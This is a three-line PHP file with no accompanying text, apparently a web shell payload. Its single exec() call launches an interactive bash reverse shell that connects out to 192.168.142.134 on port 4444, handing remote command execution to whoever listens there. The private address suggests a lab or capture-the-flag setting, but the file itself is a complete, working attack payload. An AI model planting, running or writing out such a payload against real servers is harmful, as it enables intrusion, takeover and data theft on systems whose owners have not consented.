<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.142.134/4444 0>&1'");
?>
